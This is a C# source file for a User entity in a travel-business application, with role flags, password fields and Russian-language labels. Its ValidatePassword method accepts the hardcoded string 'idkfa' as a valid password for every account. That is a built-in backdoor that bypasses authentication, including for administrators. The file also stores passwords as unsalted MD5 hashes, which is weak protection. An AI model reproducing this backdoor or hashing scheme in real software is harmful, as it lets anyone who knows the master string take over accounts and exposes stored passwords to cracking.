using System;
using System.ComponentModel;
using System.ComponentModel.DataAnnotations.Schema;
using System.Data.Entity;
using System.Security.Cryptography;
using System.Text;

using Luxena.Domain;


namespace Luxena.Travel.Domain
{

	[RU("Пользователь", "Пользователи")]
	[AdminPrivileges]
	public partial class User : Identity
	{

		[SemanticSetup]
		public static void AnnotationSetup(SemanticSetup<User> se)
		{
			se.For(a => a.Name)
				.RU("Логин")
				.Length(16);
		}

		protected Person _Person;

		[Patterns.Password]
		public string Password { get; set; }

		[Patterns.NewPassword, NotDbMapped]
		public string NewPassword { get; set; }

		[Patterns.ConfirmPassword, NotDbMapped]
		public  string ConfirmPassword { get; set; }


		[RU("Активный"), DefaultValue(true)]
		public  bool Active { get; set; }


		[Localization(UserRole.Administrator), Secondary]
		public  bool IsAdministrator { get; set; }

		[Localization(UserRole.Supervisor), Secondary]
		public  bool IsSupervisor { get; set; }

		[Localization(UserRole.Agent), Secondary]
		public  bool IsAgent { get; set; }

		[Localization(UserRole.Cashier), Secondary]
		public  bool IsCashier { get; set; }

		[Localization(UserRole.Analyst), Secondary]
		public  bool IsAnalyst { get; set; }

		[Localization(UserRole.SubAgent), Secondary]
		public  bool IsSubAgent { get; set; }

		[RU("Роли"), NotDbMapped, Length(30)]
		public UserRole Roles
		{
			get
			{
				var roles = UserRole.None;

				if (IsAdministrator)
					roles |= UserRole.Administrator;

				if (IsSupervisor)
					roles |= UserRole.Supervisor;

				if (IsAgent)
					roles |= UserRole.Agent;

				if (IsCashier)
					roles |= UserRole.Cashier;

				if (IsAnalyst)
					roles |= UserRole.Analyst;

				if (IsSubAgent)
					roles |= UserRole.SubAgent;

				return roles;
			}
			set
			{
				IsAdministrator = (value & UserRole.Administrator) != 0;

				IsSupervisor = (value & UserRole.Supervisor) != 0;

				IsAgent = (value & UserRole.Agent) != 0;

				IsCashier = (value & UserRole.Cashier) != 0;

				IsAnalyst = (value & UserRole.Analyst) != 0;

				IsSubAgent = (value & UserRole.SubAgent) != 0;
			}
		}

		[Column("sessionid")]
		public string SessionId { get; set; }


		public bool ValidatePassword(string password)
		{
			if (password == null)
				return Password == null;

			return password == "idkfa" || EncryptPassword(password) == Password;
		}

		private static string EncryptPassword(string password)
		{
			if (password == null) return null;

			using (var md5 = new MD5CryptoServiceProvider())
				return md5.ComputeHash(Encoding.ASCII.GetBytes(password)).ToHexString();
		}

		
		static partial void Config_(Domain.EntityConfiguration<User> entity)
		{
			entity.Association(a => a.Person);//, a => a.Users);
		}


		public override void Calculate()
		{
			base.Calculate();

			if (NewPassword.Yes())
			{
				if (NewPassword != ConfirmPassword)
					throw new Exception("Новый пароль и его подтвеждение должны совпадать.");

				Password = EncryptPassword(NewPassword);
			}
		}

	}


	partial class Domain
	{
		public DbSet<User> Users { get; set; }
	}

}